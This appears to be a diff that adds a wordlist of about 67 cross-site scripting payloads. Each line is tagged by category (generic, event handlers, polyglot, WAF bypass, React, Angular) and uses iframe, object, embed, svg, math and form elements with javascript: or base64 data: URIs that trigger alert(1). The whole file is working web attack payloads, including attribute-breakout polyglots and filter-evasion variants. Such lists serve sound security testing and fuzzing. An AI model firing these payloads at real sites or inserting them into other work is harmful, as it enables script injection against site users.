@@ -1,0 +1,67 @@
+[EMBEDDED] [GENERIC] <form onreset=alert(1)>
+[EMBEDDED] [GENERIC] <form onsubmit=alert(1)>
+[EMBEDDED] [EVENT_HANDLERS] <video onplay=alert(1)>
+[EMBEDDED] [EVENT_HANDLERS] <form onreset=alert(1)>
+[EMBEDDED] [EVENT_HANDLERS] <form onsubmit=alert(1)>
+[EMBEDDED] [EVENT_HANDLERS] <video onended=alert(1)>
+[EMBEDDED] [EVENT_HANDLERS] <video onpause=alert(1)>
+[EMBEDDED] [EVENT_HANDLERS] <video onseeked=alert(1)>
+[EMBEDDED] [EVENT_HANDLERS] <video onplaying=alert(1)>
+[EMBEDDED] [GENERIC] <embed src="javascript:alert(1)">
+[EMBEDDED] [EVENT_HANDLERS] <video onwaiting=alert(1)>
+[EMBEDDED] [EVENT_HANDLERS] <video onseeking=alert(1)>
+[EMBEDDED] [EVENT_HANDLERS] <audio onsuspend=alert(1)>
+[EMBEDDED] [GENERIC] <iframe src="javascript:alert(1)">
+[EMBEDDED] [GENERIC] <object data="javascript:alert(1)">
+[EMBEDDED] [WAF_BYPASS] <iframe src="javascript:alert(1)
+[EMBEDDED] [GENERIC] <base href="javascript:alert(1)//">
+[EMBEDDED] [EVENT_HANDLERS] <video ontimeupdate=alert(1)>
+[EMBEDDED] [EVENT_HANDLERS] <audio onratechange=alert(1)>
+[EMBEDDED] [GENERIC] <svg><script>alert(1)</script></svg>
+[EMBEDDED] [POLYGLOT] '><embed src="javascript:alert(1)">
+[EMBEDDED] [POLYGLOT] "><embed src="javascript:alert(1)">
+[EMBEDDED] [POLYGLOT] '><iframe src="javascript:alert(1)">
+[EMBEDDED] [ANGULAR] <iframe ng-src="javascript:alert(1)">
+[EMBEDDED] [POLYGLOT] "><iframe src="javascript:alert(1)">
+[EMBEDDED] [WAF_BYPASS] <iframe/src="javascript:alert(1)">
+[EMBEDDED] [EVENT_HANDLERS] <video onvolumechange=alert(1)>
+[EMBEDDED] [POLYGLOT] '><object data="javascript:alert(1)">
+[EMBEDDED] [POLYGLOT] '><base href="javascript:alert(1)//">
+[EMBEDDED] [POLYGLOT] "><base href="javascript:alert(1)//">
+[EMBEDDED] [POLYGLOT] "><object data="javascript:alert(1)">
+[EMBEDDED] [REACT] <embed src="javascript:alert(1)"></embed>
+[EMBEDDED] [POLYGLOT] "><svg><script>alert(1)</script></svg>
+[EMBEDDED] [POLYGLOT] '><svg><script>alert(1)</script></svg>
+[EMBEDDED] [REACT] <iframe src="javascript:alert(1)"></iframe>
+[EMBEDDED] [REACT] <object data="javascript:alert(1)"></object>
+[EMBEDDED] [GENERIC] <applet code="javascript:alert(1)"></applet>
+[EMBEDDED] [POLYGLOT] '><applet code="javascript:alert(1)"></applet>
+[EMBEDDED] [POLYGLOT] "><applet code="javascript:alert(1)"></applet>
+[EMBEDDED] [ANGULAR] <form ng-submit="alert(1)"><button>X</button></form>
+[EMBEDDED] [GENERIC] <form action="javascript:alert(1)"><input type=submit>
+[EMBEDDED] [GENERIC] <math><a xlink:href="javascript:alert(1)">Click</a></math>
+[EMBEDDED] [REACT] <form action="javascript:alert(1)"><button>X</button></form>
+[EMBEDDED] [POLYGLOT] '><math><a xlink:href="javascript:alert(1)">Click</a></math>
+[EMBEDDED] [POLYGLOT] "><math><a xlink:href="javascript:alert(1)">Click</a></math>
+[EMBEDDED] [POLYGLOT] "><form action="javascript:alert(1)"><button>X</button></form>
+[EMBEDDED] [POLYGLOT] '><form action="javascript:alert(1)"><button>X</button></form>
+[EMBEDDED] [GENERIC] <object type="text/x-scriptlet" data="javascript:alert(1)"></object>
+[EMBEDDED] [GENERIC] <svg><animate attributeName="href" values="javascript:alert(1)"></svg>
+[EMBEDDED] [GENERIC] <math><mi xlink:href="data:x/x,<script>alert(1)</script>"></mi></math>
+[EMBEDDED] [POLYGLOT] "><object type="text/x-scriptlet" data="javascript:alert(1)"></object>
+[EMBEDDED] [POLYGLOT] '><object type="text/x-scriptlet" data="javascript:alert(1)"></object>
+[EMBEDDED] [GENERIC] <svg><animateTransform attributeName="onmousemove" to="alert(1)"></svg>
+[EMBEDDED] [POLYGLOT] "><math><mi xlink:href="data:x/x,<script>alert(1)</script>"></mi></math>
+[EMBEDDED] [POLYGLOT] '><math><mi xlink:href="data:x/x,<script>alert(1)</script>"></mi></math>
+[EMBEDDED] [GENERIC] <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+[EMBEDDED] [GENERIC] <embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></embed>
+[EMBEDDED] [REACT] <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+[EMBEDDED] [REACT] <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+[EMBEDDED] [REACT] <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+[EMBEDDED] [GENERIC] <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+[EMBEDDED] [GENERIC] <dialog open onclose=alert(1)><form method="dialog"><button>X</button></form></dialog>
+[EMBEDDED] [REACT] <form action="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><button>X</button></form>
+[EMBEDDED] [GENERIC] <form action="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><button>X</button></form>
+[EMBEDDED] [POLYGLOT] '><svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>
+[EMBEDDED] [POLYGLOT] "><svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>
+[EMBEDDED] [GENERIC] <svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a></svg>
